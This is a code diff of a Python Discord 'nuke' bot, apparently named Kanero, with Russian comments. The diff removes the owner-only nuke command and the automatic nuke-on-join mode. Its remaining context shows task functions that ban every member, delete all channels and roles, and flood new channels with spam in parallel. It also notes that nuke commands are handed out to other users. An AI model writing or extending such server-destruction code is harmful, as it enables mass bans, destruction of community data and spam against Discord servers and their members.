@@ -172,11 +172,11 @@ def save_premium():
 
 
 def save_owner_nuke_list():
-    asyncio.create_task(db_set("data", "owner_nuke_list", OWNER_NUKE_LIST))
+    pass  # owner_nuke_list удалён
 
 
 def is_owner_nuker(user_id):
-    return user_id in OWNER_NUKE_LIST or user_id == config.OWNER_ID
+    return user_id == config.OWNER_ID
 
 
 def load_whitelist():
@@ -200,7 +200,6 @@ def load_spam_text():
 
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
-OWNER_NUKE_LIST: list[int] = []
 FREELIST: list[int] = []  # выдаётся через канал addbot — только !nuke и !auto_nuke
 
 # ─── ВРЕМЕННЫЕ ПОДПИСКИ ────────────────────────────────────
@@ -399,6 +398,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
+    # Всё параллельно: баним + удаляем каналы + удаляем роли + создаём каналы со спамом
     await asyncio.gather(
         *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
         *[c.delete() for c in channels_to_delete],
@@ -466,6 +466,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
+    # Всё параллельно: баним + удаляем каналы + удаляем роли + создаём каналы со спамом
     await asyncio.gather(
         *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
         *[c.delete() for c in channels_to_delete],
@@ -1876,73 +1877,10 @@ def save_auto_owner_nuke():
     }))
 
 
-@bot.command(name="owner_nuke")
-async def owner_nuke(ctx, *, text: str = None):
-    """Полный нюк без ограничений. Только для овнера."""
-    if not is_owner_nuker(ctx.author.id):
-        return
-    guild = ctx.guild
-    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
-        return
-    if is_guild_blocked(guild.id):
-        await ctx.send("🔒 Этот сервер заблокирован.")
-        return
-    if nuke_running.get(guild.id):
-        await ctx.send("⚡ Краш уже запущен.")
-        return
-    nuke_running[guild.id] = True
-    nuke_starter[guild.id] = ctx.author.id
-    spam_text = text if text else config.SPAM_TEXT
-    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
-    last_spam_text[guild.id] = spam_text
-    asyncio.create_task(do_owner_nuke_task(guild, spam_text))
-    asyncio.create_task(log_nuke(guild, ctx.author, "owner_nuke"))
-
-
-@bot.command(name="auto_owner_nuke")
-async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
-    """Авто owner_nuke при входе бота на сервер. Только для овнера."""
-    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
-    if not is_owner_nuker(ctx.author.id):
-        return
-    if state.lower() == "on":
-        AUTO_OWNER_NUKE = True
-        save_auto_owner_nuke()
-        embed = discord.Embed(
-            title="👑 Auto Owner Nuke — ВКЛЮЧЁН",
-            description=(
-                "При входе бота на сервер:\n"
-                "• Бан ВСЕХ участников\n"
-                "• Удаление каналов и ролей\n"
-                "• Создание каналов со спамом\n\n"
-                f"Текст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`"
-            ),
-            color=0x0a0a0a
-        )
-        embed.set_footer(text="☠️ Kanero")
-        await ctx.send(embed=embed)
-    elif state.lower() == "off":
-        AUTO_OWNER_NUKE = False
-        save_auto_owner_nuke()
-        await ctx.send("❌ **Auto Owner Nuke** выключен.")
-    elif state.lower() == "text":
-        if not text:
-            await ctx.send("Укажи текст: `!auto_owner_nuke text <текст>`")
-            return
-        AUTO_OWNER_NUKE_TEXT = text
-        save_auto_owner_nuke()
-        await ctx.send(f"✅ Текст обновлён:\n```{text[:500]}```")
-    elif state.lower() == "info":
-        status = "✅ Включён" if AUTO_OWNER_NUKE else "❌ Выключен"
-        await ctx.send(f"Auto Owner Nuke: **{status}**\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`")
-    else:
-        await ctx.send("`!auto_owner_nuke on/off/text/info`")
-
-
 @bot.command(name="auto_off")
 async def auto_off(ctx):
     """Выключить все авто нюки. Только для владельца сервера."""
-    global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE, AUTO_OWNER_NUKE
+    global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE
     # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
@@ -1951,15 +1889,12 @@ async def auto_off(ctx):
     save_auto_super_nuke()
     AUTO_SUPERPR_NUKE = False
     save_auto_superpr_nuke()
-    AUTO_OWNER_NUKE = False
-    save_auto_owner_nuke()
     embed = discord.Embed(
         title="🔴 Все авто нюки выключены",
         description=(
             "❌ `auto_nuke` — выключен\n"
             "❌ `auto_super_nuke` — выключен\n"
-            "❌ `auto_superpr_nuke` — выключен\n"
-            "❌ `auto_owner_nuke` — выключен"
+            "❌ `auto_superpr_nuke` — выключен"
         ),
         color=0x0a0a0a
     )
@@ -1991,11 +1926,6 @@ async def auto_info(ctx):
     embed.add_field(
         name="⚡ auto_superpr_nuke",
         value=f"{st(AUTO_SUPERPR_NUKE)}\nТекст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n`!auto_superpr_nuke on/off`",
-        inline=False
-    )
-    embed.add_field(
-        name="👑 auto_owner_nuke",
-        value=f"{st(AUTO_OWNER_NUKE)}\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`\n`!auto_owner_nuke on/off`",
         inline=False
     )
     embed.set_footer(text="☠️ Kanero  |  !auto_off — выключить все")
